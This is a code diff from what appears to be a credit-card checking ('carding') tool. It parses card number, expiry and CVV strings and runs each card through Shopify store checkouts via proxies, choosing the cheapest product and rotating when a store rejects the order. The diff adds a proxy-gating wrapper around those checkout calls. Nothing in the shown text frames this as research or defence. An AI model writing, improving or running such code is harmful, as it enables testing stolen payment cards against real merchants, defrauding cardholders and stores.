@@ -435,11 +435,21 @@ def _sh2_run(cc, site, proxy, variant):
 def _sh2_run_once(cc, site, proxy, variant):
     from gates.shopify_v2 import process_card as _sh2pc, fetch_products as _sfp
     import asyncio as _aio
+    try:
+        from gates.shopify_v2 import _proxy_gate as _sh2_gate, parse_proxy as _sh2_pp
+    except Exception:
+        _sh2_gate = None
+
+    async def _gated(coro):
+        if _sh2_gate is None:
+            return await coro
+        async with _sh2_gate(_sh2_pp(proxy) if proxy else None):
+            return await coro
     parts = cc.split("|")
     ccn, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
 
     if variant:
-        return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, variant, proxy or None))
+        return _aio.run(_gated(_sh2pc(ccn, mm, yy, cvv, site, variant, proxy or None)))
 
     # pick the cheapest, then rotate when a store re-prices it to $0, churns a digital
     # product, or rejects it via a store rule (VALIDATION_CUSTOM = minimum-order etc.)
@@ -449,7 +459,7 @@ def _sh2_run_once(cc, site, proxy, variant):
     except Exception:
         info = None
     if not isinstance(info, dict) or not info.get("variant_id"):
-        return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, None, proxy or None))
+        return _aio.run(_gated(_sh2pc(ccn, mm, yy, cvv, site, None, proxy or None)))
 
     tried = {info["variant_id"]}
     cands = [{"id": info["variant_id"], "price": float(info.get("price") or 0)}]
